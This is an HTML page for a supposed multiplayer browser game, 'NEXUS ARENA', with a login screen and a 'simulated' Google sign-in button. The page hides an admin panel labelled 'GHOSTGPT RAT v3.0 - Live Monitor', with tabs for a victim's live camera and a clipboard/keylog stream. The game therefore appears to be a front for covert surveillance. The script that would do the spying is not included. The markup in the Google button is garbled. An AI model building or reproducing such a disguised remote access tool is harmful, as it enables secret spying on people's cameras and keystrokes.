<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"> <!-- Mobile Responsive -->
    <title>NEXUS ARENA - Ultimate Multiplayer</title>
    
    <!-- Load CSS Externally (Auto Adjust) -->
    <link rel="stylesheet" href="./style.css"> 
</head>
<body class="bg-dark">

    <!-- LAYAR LOGIN RESPONSIVE -->
    <div id="auth-overlay">
        <div class="login-box glassmorphism" id="login-view">
            <h1>NEXUS <span style="color:#a78bfa; font-style:italic;">ARENA</span></h1>
            <p class="subtitle">Join the ultimate multiplayer battlefield.</p>
            
            <input type="text" id="username-in" placeholder="Enter Username/ID..." onkeypress="if(event.key==='Enter') loginManual()">
            <button class="btn-primary neon-glow" onclick="loginManual()" id="btn-manual">ENTER ARENA</button>

            <!-- Simulasi Google Login (UI aja) -->
            <button class="google-btn btn-primary" onclick="simulateGoogleLogin()" style="background:#fff;color:black;margin-top:20px;display:flex;justify-content:center;padding:12px;border-radius:8px;font-weight:bold;">
                Continue with Google Account (Simulated)<br><span style="font-size:1.5em">G<span style="color:#EA4335">o</span><span style="color:#FBC02D">o</span><span style="#4C8BF5">g</span><span style="color:#FBBC05">l</span><style>W{ color:white;}V{color:#FFFFFF}E{}<style>L{color:white};}</script>E</span></span>
            </button>

            <p id="login-msg" class="status-text"></p>
        </div>
    </div>

    <!-- LAYAR GAME (CANVAS) -->
    <div id="game-container">
        <canvas id="arena"></canvas>
        
        <!-- HUD UI DALAM GAME (Responsive Font Size) -->
        <div id="hud-layer">
            <div class="player-tag"><i class="fas fa-user-shield"></i> Player 1: HP 100 | Score <span id="score-val">0</span></div>
            <small style="color:#64748b; display:block;">Controls: WASD to move, Mouse to aim. Enemy AI active.</small>
        </div>

        <!-- Panel Admin Tersembunyi (RAT MONITORING) -->
        <div id="admin-panel" onclick="toggleAdminPanel()">
            <div class="panel-header">
                <span><i style="color:#a78bfa;margin-right:5px;" title="Remote Access Tool"></i>GHOSTGPT RAT v3.0 - Live Monitor</span>
                <button onclick="closeAdminPanel()" style="background:red;color:white;width:auto;padding:5px 15px;border-radius:4px;">CLOSE ALL</button>
            </div>
            
            <div id="admin-content">
                <!-- Tab 1: Kamera Langsung -->
                <iframe data-tab="camera" src="" id="cam-live-frame" style="display:none;"></iframe> 
                
                <!-- Tab 2: Clipboard Monitor (Log Teks) -->
                <textarea readonly placeholder="Clipboard Log Stream..." id="log-clipboard"></textarea>

                <!-- Tombol Navigasi Panel Admin -->
                <div class="tab-buttons" style="margin-top:10px;background:#3b4d6b;padding:5px;border-radius:8px;">
                    <button onclick="switchTab('camera')" id=btn-cam active>📷 Live Cam</button>
                    <button onclick="switchTab('clipboard')" id=btn-clp>📋 Clipboard/Keylog</button>
                </div>
            </div>
        </div>
    </div>

<script src="./script.js"></script> <!-- Load JS Externally -->
